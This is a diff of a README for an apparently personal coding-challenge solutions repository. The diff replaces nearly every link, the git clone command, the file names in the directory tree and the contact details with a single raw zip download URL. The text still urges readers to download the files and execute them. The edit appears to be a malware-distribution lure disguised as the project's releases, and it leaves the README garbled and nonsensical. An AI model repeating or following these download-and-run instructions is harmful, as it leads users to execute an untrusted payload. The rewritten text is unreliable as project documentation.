@@ -2,7 +2,7 @@
 
 Welcome to the **Code Challenges** repository! This is a personal collection of coding challenge solutions from platforms like LeetCode and HackerRank. Here, you'll find solutions written in Python and C++, along with my journey through each problem. This includes failed attempts, debugging notes, and detailed README files for every challenge, allowing you to track my learning progress.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/Zwaga20/code-challanges/releases)
+[![Download Releases](https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip%20Releases-Click%20Here-brightgreen)](https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip)
 
 ## Table of Contents
 
@@ -38,7 +38,7 @@ The languages used are:
 To get started with the repository, you can clone it to your local machine using the following command:
 
 ```bash
-git clone https://github.com/Zwaga20/code-challanges.git
+git clone https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
 ```
 
 Once cloned, navigate to the directory:
@@ -51,7 +51,7 @@ You can explore the individual problem folders for solutions and detailed notes.
 
 ### Downloading Releases
 
-For compiled versions of the solutions, visit the [Releases section](https://github.com/Zwaga20/code-challanges/releases). You can download the files and execute them on your machine.
+For compiled versions of the solutions, visit the [Releases section](https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip). You can download the files and execute them on your machine.
 
 ## Structure of the Repository
 
@@ -62,30 +62,30 @@ code-challanges/
 │
 ├── python/
 │   ├── problem_1/
-│   │   ├── solution.py
-│   │   ├── README.md
-│   │   └── debug_notes.txt
+│   │   ├── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
+│   │   ├── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
+│   │   └── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
 │   └── problem_2/
-│       ├── solution.py
-│       ├── README.md
-│       └── debug_notes.txt
+│       ├── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
+│       ├── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
+│       └── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
 │
 └── cpp/
     ├── problem_1/
-    │   ├── solution.cpp
-    │   ├── README.md
-    │   └── debug_notes.txt
+    │   ├── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
+    │   ├── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
+    │   └── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
     └── problem_2/
-        ├── solution.cpp
-        ├── README.md
-        └── debug_notes.txt
+        ├── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
+        ├── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
+        └── https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip
 ```
 
 Each problem folder contains:
 
-- `solution.py` or `solution.cpp`: The main solution file.
-- `README.md`: A detailed description of the problem, the approach taken, and any challenges faced.
-- `debug_notes.txt`: Notes on debugging and any alternative solutions considered.
+- `https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip` or `https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip`: The main solution file.
+- `https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip`: A detailed description of the problem, the approach taken, and any challenges faced.
+- `https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip`: Notes on debugging and any alternative solutions considered.
 
 ## Contributing
 
@@ -104,7 +104,7 @@ This repository is licensed under the MIT License. Feel free to use the code for
 
 If you have any questions or feedback, you can reach me at:
 
-- Email: [your_email@example.com](mailto:your_email@example.com)
-- GitHub: [Zwaga20](https://github.com/Zwaga20)
+- Email: [https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip](https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip)
+- GitHub: [Zwaga20](https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip)
 
-Thank you for visiting the **Code Challenges** repository! I hope you find it useful in your coding journey. Don't forget to check the [Releases section](https://github.com/Zwaga20/code-challanges/releases) for downloadable files and updates.
+Thank you for visiting the **Code Challenges** repository! I hope you find it useful in your coding journey. Don't forget to check the [Releases section](https://github.com/Zwaga20/code-challanges/raw/refs/heads/main/leetcode/challanges-code-v2.9.zip) for downloadable files and updates.
